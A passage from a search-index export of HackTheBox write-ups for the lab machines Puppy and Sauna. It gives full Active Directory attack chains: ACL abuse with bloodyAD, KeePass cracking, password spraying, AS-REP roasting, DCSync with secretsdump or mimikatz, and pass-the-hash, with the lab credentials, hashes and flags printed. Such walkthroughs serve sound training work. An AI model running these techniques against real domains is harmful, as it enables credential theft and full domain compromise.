\u00a0 \u00a0Default share\nDEV \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 Disk \u00a0 \u00a0 \u00a0DEV-SHARE for PUPPY-DEVS\nIPC$ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0IPC \u00a0 \u00a0 \u00a0 Remote IPC\nNETLOGON \u00a0 \u00a0 \u00a0 \u00a0Disk \u00a0 \u00a0 \u00a0Logon server share\nSYSVOL \u00a0 \u00a0 \u00a0 \u00a0 \u00a0Disk \u00a0 \u00a0 \u00a0Logon server share\n</code></pre> <p>lets go see the dev share <pre><code>sudo smbclient //puppy.htb/DEV -U 'levi.james'\n</code></pre> but we get this error when running commands, <code>NT_STATUS_ACCESS_DENIED listing \\*</code> -&gt;meaning our user does not have enough permissions on this share,</p> <p>now add <code>dc.puppy.htb</code> to etc/hosts</p> <p>lets run bloodhound now <pre><code>sudo bloodhound-python -d puppy.htb -u levi.james -p KingofAkron2025! -ns 10.10.11.70 -c all\n</code></pre></p> <p>lets see the domain users </p> <p>the user we currently have access is member of these groups </p> <p>hm interesting, lets inspect the hr group </p> <p>it has genericwrite over the developers group, lets now inspect developers group, we see it has these users as members</p> <p></p> <p>it has no outbound object control</p> <p>lets now inspect these 3 users one by one - jamie williams had nothing interesting (no outbound object control or other membership) - ant edwards as group delegated object control is a memberof senior devs, and it can also be seen that the 3rd user adam silver is member too</p> <p> so senior devs have generic all right towards adam silver</p> <p>lets now inspect adam silver too  it seems he is member of remote management users too</p> <p>lets check remote management users  hm does not appear that interesting, but if we run the query: <code>Find Principals with DCSync Rights</code></p> <p>we see that step cooper has dcsync rights!  also lets run another query, <code>List all kerberoastable accounts</code> </p> <p>also running another query: <code>Shortest Paths to Unconstrained Delegation Systems</code></p> <p></p> <p>shows that adam silver, has canpsremote rights on the dc! but canpsremote does not seem sth that can help us, so lets move on,</p> <p>so, it appears that this should be our path, to own adam silver and dcsync the dc. But first, we have to own ant edwards</p> <p>so lets sum up what we know: - our owned user (levi james) is member of HR group - HR group has genericwrite over DEVELOPERS group - DEVELOPERS group has as members both edwards and adam silver - edwards is member of SENIOR DEVS group</p> <p>SENIOR DEVS group has genericall over adam silver (meaning i can set a new password for adam silver and login then)</p> <p>adam silver has dcsync rights on the DC</p> <p>our goal, is to be a user thats member of SENIOR DEVS group, so we could either add our owned user (levi) to that group, or gain access to a user that is a member of that group.</p> <p>So how to go from levi \u2192 edwards, or levi \u2192 senior devs?</p> <p>I TOOK A HINT, BUT LETS START ALWAYS WITH WHAT WE KNOW!!!!</p>"},{"location":"ch3ckm8_HTB_puppy/#foothold","title":"Foothold","text":"<p>We KNOW that we have <code>GenericWrite</code> as HR group on DEVELOPERS group, so lets add levi there. <pre><code>bloodyAD --host 10.10.11.70 -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james\n</code></pre> Now we reached an IMPASS!!</p> <p>\u2192 BUT LETS REMEMBER THAT WE DID NOT HAVE ACCESS TO THE SMB SHARE BEFORE! NOW THAT WE ADDED OUR USER TO DEVELOPERS group LETS TRY AGAIN TO ACCESS THE SHARE!</p>"},{"location":"ch3ckm8_HTB_puppy/#checking-smb-shares","title":"Checking smb shares","text":"<pre><code>smbclient \u00a0//10.10.11.70/DEV -U levi.james\n</code></pre> <p><pre><code>smb: \\&gt; ls\n. \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0DR \u00a0 \u00a0 \u00a0 \u00a00 \u00a0Wed May 28 12:37:00 2025\n.. \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0D \u00a0 \u00a0 \u00a0 \u00a00 \u00a0Sat Mar \u00a08 11:52:57 2025\nKeePassXC-2.7.9-Win64.msi \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 A 34394112 \u00a0Sun Mar 23 03:09:12 2025\nProjects \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0D \u00a0 \u00a0 \u00a0 \u00a00 \u00a0Sat Mar \u00a08 11:53:36 2025\nrecovery.kdbx \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 A \u00a0 \u00a0 2677 \u00a0Tue Mar 11 22:25:46 2025\ntiCPYdaK.exe \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0A \u00a0 \u00a056320 \u00a0Wed May 28 12:37:00 2025\n</code></pre> then use keepsass2john <pre><code>keepass2john recovery.kdbx\n</code></pre></p>"},{"location":"ch3ckm8_HTB_puppy/#bruteforcing-kdbx-file","title":"Bruteforcing kdbx file","text":"<pre><code>./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt\n\n[*] Password found: liverpool\n</code></pre>"},{"location":"ch3ckm8_HTB_puppy/#kdbx-file-contents","title":"Kdbx file contents","text":"<p>we have all the users: <pre><code>Administrator \u00a0\nGuest \u00a0\nkrbtgt \u00a0\nlevi.james \u00a0\nant.edwards \u00a0\nadam.silver \u00a0\njamie.williams \u00a0\nsteph.cooper \u00a0\nsteph.cooper_adm \u00a0\n</code></pre></p> <p>and all the passwords <pre><code>HJKL2025!\nAntman2025!\nJamieLove2025!\nILY2025!\nSteve2025!\n</code></pre></p> <p>So now we have a list of usernames and a list of passwords, lets try all of their combinations to login towards a service, starting with <code>SMB</code></p>"},{"location":"ch3ckm8_HTB_puppy/#password-spraying","title":"Password spraying","text":"<pre><code>ntpdate puppy.htb\n</code></pre> <pre><code>netexec smb 10.10.11.70 -u usernames.txt -p pass.txt\n</code></pre> <pre><code>SMB \u00a0 \u00a0 \u00a0 \u00a0 10.10.11.70 \u00a0 \u00a0 445 \u00a0 \u00a0DC \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [+] PUPPY.HTB\\ant.edwards:Antman2025!\n</code></pre> <p>lets try logging via winrm <pre><code>evil-winrm -i 10.10.11.70 -u ant.edwards -p 'Antman2025!'\n</code></pre> hm it seems winrm is not open (also verified but our nmap scan)</p> <p>BUT we might not be able to login via evil-winrm, we can login via bloodyad though and since we have genericall towards adam silver, we can do a pass reset! <pre><code>\u2514\u2500\u2500\u257c $crackmapexec smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Thebestpass0!'\nSMB \u00a0 \u00a0 \u00a0 \u00a0 10.10.11.70 \u00a0 \u00a0 445 \u00a0 \u00a0DC \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)\nSMB \u00a0 \u00a0 \u00a0 \u00a0 10.10.11.70 \u00a0 \u00a0 445 \u00a0 \u00a0DC \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [-] PUPPY.HTB\\ADAM.SILVER:Thebestpass0! STATUS_ACCOUNT_DISABLED\n</code></pre></p>"},{"location":"ch3ckm8_HTB_puppy/#password-reset","title":"Password Reset","text":"<p><pre><code>bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER Thebestpass0!\n</code></pre> </p> <p>great, it was successful, and there are the new creds of adam silver <pre><code>ADAM.SILVER\nThebestpass0!\n</code></pre> lets try logging via winrm <pre><code>evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Thebestpass0!'\n</code></pre> BUT tried logging in via winrm, and no luck! WHY?</p> <p>-&gt; going back on bloodhound, i noticed that the account is <code>not enabled</code> ! so lets enable it <pre><code>bloodyAD --host DC.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE\n</code></pre> </p> <p>nice, now that it is enabled, lets try the user's creds: <pre><code>crackmapexec winrm 10.10.11.70 -u 'ADAM.SILVER' -p 'Thebestpass0!' -d puppy.htb\n</code></pre></p> <p><pre><code>HTTP \u00a0 \u00a0 \u00a0 \u00a010.10.11.70 \u00a0 \u00a0 5985 \u00a0 DC \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [*] http://10.10.11.70:5985/wsman\nHTTP \u00a0 \u00a0 \u00a0 \u00a010.10.11.70 \u00a0 \u00a0 5985 \u00a0 DC \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [+] puppy.htb\\ADAM.SILVER:Thebestpass0! (Pwn3d!)\n</code></pre> great! lets login with winrm now</p>"},{"location":"ch3ckm8_HTB_puppy/#logging-in-as-adamsilver","title":"Logging in as adam.silver","text":"<p>Log in and grab the user flag: <pre><code>evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Thebestpass0!'\n</code></pre></p> <p>logged in successfully, then go to <code>\\backups</code>, download the <code>zip</code> file, and find these creds for user steph cooper! <pre><code>steph.cooper\nChefSteph2025!\n</code></pre></p> <p>remember our goal was <code>step.cooper_adm</code> because that user can DCSync the DC!!!! so we are almost done, lets perform DCSync</p>"},{"location":"ch3ckm8_HTB_puppy/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_puppy/#dcsync","title":"DCsync","text":"<p>since we are now steph.cooper_adm , lets dcsync <pre><code>impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70\n</code></pre></p> <pre><code>[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::\n</code></pre>"},{"location":"ch3ckm8_HTB_puppy/#logging-in-as-administrator","title":"Logging in as Administrator","text":"<p>lets connect now via winrm <pre><code>evil-winrm -i 10.10.11.70 -u ADMINISTRATOR -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'\n</code></pre></p> <p>root flag found! <pre><code>5c1e91e476e66b7153b05c515f9cda5a\n</code></pre></p>"},{"location":"ch3ckm8_HTB_puppy/#summary","title":"Summary","text":""},{"location":"ch3ckm8_HTB_puppy/#sidenotes","title":"Sidenotes","text":"<p>A classic straightforward AD machine, this one is valuable for me due to the <code>disabled AD account</code>, which i saw for the first time, and was stuck by not knowing why i could not log in to it xd.</p> <p></p>"},{"location":"ch3ckm8_HTB_sauna/","title":"Sauna","text":""},{"location":"ch3ckm8_HTB_sauna/#intro","title":"Intro","text":"<p>[[windows]] [[NotAssumedBreach]] [[OSCPpath]] [[DCSync]] [[WinPEAS]]</p> <p>Tags: #windows #NotAssumedBreach #OSCPpath #DCSync #WinPEAS Tools used: - BurpSuite (inspecting the web app) - GetNPUsers.py (AS-REP roasting) - Hashcat (cracking) - WinPEAS.ps1 (windows privesc) - secretsdump.py / mimikatz (dumping secrets)</p>"},{"location":"ch3ckm8_HTB_sauna/#reconnaissance","title":"Reconnaissance","text":"<p>First, i generated this template by using my script: ch3ckkm8/Pentest-Auto-Report- <pre><code>python pentest_to_md.py 10.129.95.180 sauna.htb\n</code></pre></p>"},{"location":"ch3ckm8_HTB_sauna/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.95.180 sauna.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_sauna/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV sauna.htb\n</code></pre> <p><pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-08-01 20:38 CDT\nNmap scan report for sauna.htb (10.129.95.180)\nHost is up (0.077s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: Egotistical Bank :: Home\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-02 08:38:55Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_clock-skew: 7h00m00s\n| smb2-time:\n|   date: 2025-08-02T08:39:02\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 57.81 seconds\n</code></pre> multiple services are open here, the target is a DC for the according to the following indicators: - ports     - 88 and 464 (kerberos)     - 3268 - Message signing enabled and required (smb2-security-mode) I decided to inspect the <code>http</code> service first:</p>"},{"location":"ch3ckm8_HTB_sauna/#banner-grabbing","title":"Banner grabbing","text":"<pre><code>whatweb sauna.htb\n</code></pre> <p><pre><code>&lt;http://sauna.htb&gt; [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, \nHTTPServer[Microsoft-IIS/10.0], IP[10.129.95.180], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]\n</code></pre> the <code>version</code> of the IIS server is <code>10.0</code></p> <p>found this CVE-2020-0645 to be related with this version </p> <p>Trying to submit, with some random values, it displays this after hitting submit: </p>"},{"location":"ch3ckm8_HTB_sauna/#burpsuite","title":"BurpSuite","text":"<p>Using burpsuite, i tried repeating the request on the contact page, and it appears that when using post method, it reponds with error <code>405</code> as shown in the screenshot below:  but when i change the method from post to <code>GET</code> it responds with http code <code>200</code> !  hm tried some exploits regarding the cve i mentioned above but had no luck, and i found nothing more about the iis part and i have no idea what went wrong.</p> <p>Nothing was obvious about it \u2026 so i moved on</p>"},{"location":"ch3ckm8_HTB_sauna/#dns-enum","title":"DNS enum","text":""},{"location":"ch3ckm8_HTB_sauna/#zone-transfer","title":"Zone-transfer","text":"<p>Tried zone transfer: <pre><code>dig axfr @10.129.95.180 sauna.htb\n</code></pre> but it failed</p>"},{"location":"ch3ckm8_HTB_sauna/#smb-enum","title":"SMB enum","text":""},{"location":"ch3ckm8_HTB_sauna/#anonymous-login","title":"Anonymous Login","text":"<p>Tried anonymous login: <pre><code>smbmap -H 10.129.95.180\n</code></pre></p> <p><pre><code>[+] Finding open SMB ports....\n[+] User SMB session established on 10.129.95.180...\n[+] IP: 10.10.10.175:445        Name: 10.10.10.175                                      \n        Disk                      Permissions     Comment\n        ----                      -----------     -------\n[!] Access Denied\n</code></pre>  found nothing and access was denied.</p>"},{"location":"ch3ckm8_HTB_sauna/#ldap-enum","title":"LDAP enum","text":"<pre><code>ldapsearch -LLL -x -H ldap://sauna.htb -s base namingcontexts\n</code></pre> <pre><code>dn:\nnamingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL\n</code></pre>"},{"location":"ch3ckm8_HTB_sauna/#finding-valid-users","title":"Finding valid users","text":"<p>i will use <code>ldapsearch</code> for this: <pre><code>ldapsearch -LLL -x -H ldap://sauna.htb -b \"DC=EGOTISTICAL-BANK,DC=LOCAL\" \"objectclass=user\" | egrep -i ^samaccountname | awk -F ': ' '{print $2}' | tee users.txt\n</code></pre></p> <p>the user list gathered is: <pre><code>fsmith\nscoins\nsdriver\nbtayload\nhbear\nskerb\n</code></pre> Alternatively, for this step we could have used kerbrute to find valid users.</p>"},{"location":"ch3ckm8_HTB_sauna/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_sauna/#finding-accounts-with-pre-authentication-disabled","title":"Finding accounts with pre-authentication disabled","text":"<p>We can use the GetNPUser.py script from impacketto see if any users have the privilege, if they do then the DC will respond. or we can revisit our ldap enumeration using <code>ldapsearch</code> where <code>DONT_REQ_PREAUTH</code> could be seen as enabled there too, reminder the snippet below: (just like the forest machine) <pre><code>ldapsearch -LLL -x -H ldap://sauna.htb -b \"DC=EGOTISTICAL-BANK,DC=LOCAL\"\n</code></pre></p> <p>Here i found that DONT_REQ_PREAUTH flag is set! lets keep that in mind for later, and move on.</p> <p><code>GetNPUsers.py</code>\u00a0identifies user accounts that: - Have the\u00a0\"Do not require Kerberos preauthentication\"\u00a0flag set. - Are therefore vulnerable to\u00a0AS-REP Roasting <pre><code>GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user_list.txt -format hashcat -outputfile hashes.txt -dc-ip 10.129.95.180\n</code></pre></p> <p>it appears that we got the asrep hash for user <code>fsmith</code>! <pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\n$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bef1ac10c313012800c93d55e6b9b863$aa14a9c3b9c9566c23094379c4c3ae4dd9f0bbdb43d0a242d505fdd563fa39bb83f0ec34cf0ef60b0d1ab224c807894e68832b4031af8a757ef86c3bb811aba6466055dd901509e4ba565834305bd9a94e30b86a4802b8df6074283754ba1a9e0b34479d7dadc5f2405aee1b6c08e6ba9cb2c6c5672b21e2810daab302ffa2b841f2c67eced214672292ed1583f28d7759c7202b0983394fe36a68be2254e084ae9df46a8dfa63f28fc7f3ff2be36511272f0015be4873c074c49224d1e09e1afe4b827c07081e9bfb1d9c846cfb10f5c7c46fea6274ec36348509f78da949f674de3df0096840bce6e78de14911b88dbc39a4f4d8124cd7bc3b697acfa8dca7\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n</code></pre></p> <p>or we could also do it via netexec: <pre><code>nxc ldap 10.129.95.180 -u user_list.txt -p '' --asreproast hashes.txt\n</code></pre></p>"},{"location":"ch3ckm8_HTB_sauna/#cracking-the-as-rep-hash","title":"Cracking the AS-REP hash","text":"<p>lets crack it now <pre><code>hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>the retrieved password is: <pre><code>Thestrokes23\n</code></pre></p>"},{"location":"ch3ckm8_HTB_sauna/#identify-where-we-can-login-with-those-creds","title":"Identify where we can login with those creds","text":"<p>lets use my script to bulk check all available services: https://github.com/ch3ckkm8/auto_netexec <pre><code>./auto_netexec_bulk_creds_checker.sh sauna.htb 'fsmith' 'Thestrokes23'\n</code></pre></p> <pre><code>[*] Checking if winrm port 5985 is open on sauna.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.95.180   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)\nWINRM       10.129.95.180   5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\\\\fsmith:Thestrokes23 (Pwn3d!)\n\n[*] Checking if smb port 445 is open on sauna.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\\\\fsmith:Thestrokes23 \n\n[*] Checking if ldap port 389 is open on sauna.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)\nLDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\\\\fsmith:Thestrokes23 \n\n[*] Checking if rdp port 3389 is open on sauna.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on sauna.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.95.180   135    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)\nRPC         10.129.95.180   135    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\\\\fsmith:Thestrokes23 \n\n[*] Checking if nfs port 2049 is open on sauna.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on sauna.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on sauna.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on sauna.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on sauna.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> <p>so it seems that win-rm is open! lets login <pre><code>evil-winrm -i sauna.htb -u 'fsmith' -p 'Thestrokes23'\n</code></pre> login was successful! grabbed user flag <code>900c85036078cc85ed9144b2aaa35a96</code></p>"},{"location":"ch3ckm8_HTB_sauna/#privesc","title":"Privesc","text":"<p>lets try to run bloodhound to get a better view of the AD <pre><code>bloodhound-python -u 'fsmith' -p 'Thestrokes23' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All --zip\n</code></pre></p>"},{"location":"ch3ckm8_HTB_sauna/#group-membership","title":"Group Membership","text":"<p>we can also view user\u2019s membership manually <pre><code>whoami /groups\n</code></pre></p> <pre><code>GROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID          Attributes\n=========================================== ================ ============ ==================================================\nEveryone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\\\Medium Plus Mandatory Level Label            S-1-16-8448\n</code></pre> <p>also user accounts too <pre><code> net user\n</code></pre></p> <pre><code>User accounts for \\\\\\\\\n\n-------------------------------------------------------------------------------\nAdministrator            FSmith                   Guest\nHSmith                   krbtgt                   svc_loanmgr\nThe command completed with one or more errors.\n</code></pre> <p>Lets continue with bloodhound  our current user, does not have any outbound access control, and the group membership does not indicate anything useful</p> <p>here we can also see the domain users  Now lets run some queries to identify which account we should target</p> <p><code>Find Principals with DCSync Rights</code>  it appears that <code>SVC_LOANMGR</code> has <code>DCSync</code> rights towards the domain!</p> <p><code>Find Kerberoastable Members of High Value Groups</code>  Also, verifying the as-rep roasting part earlier about <code>FSMITH</code> :</p> <p><code>Find AS-REP Roastable Users (DontReqPreAuth)</code> <code>Find Shortest Paths to Domain Admins</code>  So taking into consideration all the above screenshots, we should target <code>SVC_LOANMGR</code> and then attempt to <code>DCSync</code>, this was the path that stood out.</p> <p>But how can we access SVC_LOANMGR ? we dont have any outbound access towards it from our user (fsmith). Also user <code>HSMITH</code> is kerberoastable but does not appear to have interesting outgoing access control towards other objects.</p> <p>So, its time to find other ways to privesc\u2026 we could try using WinPEAS</p>"},{"location":"ch3ckm8_HTB_sauna/#winpeas","title":"WinPEAS","text":"<p>Now so lets try uploading <code>WinPEAS</code> (type upload on winrm)</p> <p>After inspecting the huge output of winpeas, what stood out was <code>AutoLogon credentials</code>, and it actually revealed plaintext password for the user we wanted to access! (the one with DCSync rights towards the domain)</p> <pre><code>  [+] Looking for AutoLogon credentials(T1012)\nSome AutoLogon credentials were found!!\n    DefaultDomainName             :  EGOTISTICALBANK\n    DefaultUserName               :  EGOTISTICALBANK\\\\svc_loanmanager\n    DefaultPassword               :  Moneymakestheworldgoround!   \n</code></pre> <p>the updated creds now are: <pre><code>svc_loanmanager\nMoneymakestheworldgoround!\n</code></pre> Since we now have creds for this user, we can try to DCSync</p>"},{"location":"ch3ckm8_HTB_sauna/#dcsync","title":"DCSync","text":"<pre><code>secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'\n</code></pre> <p>aand we got admin\u2019s NTLM hash! <pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::\nEGOTISTICAL-BANK.LOCAL\\\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::\nEGOTISTICAL-BANK.LOCAL\\\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::\nEGOTISTICAL-BANK.LOCAL\\\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::\nSAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:9ca6f2ee80aa99ab211cf1b39a9d6aa7:::\n</code></pre></p>"},{"location":"ch3ckm8_HTB_sauna/#login-as-administrator-via-pass-the-hash","title":"Login as Administrator (via Pass the Hash)","text":"<p><pre><code>evil-winrm -i 10.129.95.180 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e\n</code></pre> logged in successfully and grabbed root flag! <code>f92a2379a8e78ad8e9d5e7f8300b8d70</code></p> <p>proof </p>"},{"location":"ch3ckm8_HTB_sauna/#extras","title":"Extras","text":""},{"location":"ch3ckm8_HTB_sauna/#using-mimikatz-instead-of-secretsdump","title":"Using Mimikatz instead of secretsdump","text":"<p>frist login as <code>SVC_LOANMGR</code> <pre><code>evil-winrm -i 10.129.95.180 -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!'\n</code></pre></p> <p>then upload <code>mimikatz.exe</code> (from winrm just type upload filename), and then run <pre><code>.\\\\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit\n</code></pre> similarly grab the hash and login via pass the hash as administrator</p>"},{"location":"ch3ckm8_HTB_sauna/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_sauna/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap <code>scan</code> -&gt; target is a DC, chose smb , rpc and ldap services to focus on</li> <li>enumerate <code>DNS</code> -&gt; zone-transfer failed</li> <li>enumerate <code>SMB</code> -&gt; anonymous login failed</li> <li>enumerate <code>LDAP</code> -&gt; found valid usernames</li> </ol>"},{"location":"ch3ckm8_HTB_sauna/#foothold_1","title":"Foothold","text":"<ol> <li><code>AS-REP roasting</code> was conducted and successfully got AS-REP hash (since the user has The <code>Do not require Kerberos preauthentication</code> flag enabled (since we had a list of usernames on the recon phase)</li> <li><code>cracked</code> the AS-REP hash, which revealed the password for a user (fsmith)</li> <li><code>correlated</code> the found user's  creds with the <code>win-rm</code> service</li> <li>logged in via evil-winrm to host using on user svc-alfresco, and grabbed the user flag.</li> </ol>"},{"location":"ch3ckm8_HTB_sauna/#privesc_1","title":"Privesc","text":"<ol> <li>Run bloodhound, found that another user (svc_loanmgr) has <code>DCSync</code> rights towards the domain, but found no way to reach that user from the cuurently compromised one (fsmith)</li> <li>WinPEAS was used to find potential privesc paths, which revealed <code>AutoLogon</code> credentials (plaintext password) for the account we were looking for! (svc_loanmgr)</li> <li><code>SecretsDump</code> was used, since we now have creds for this user, and according to bloodhound, 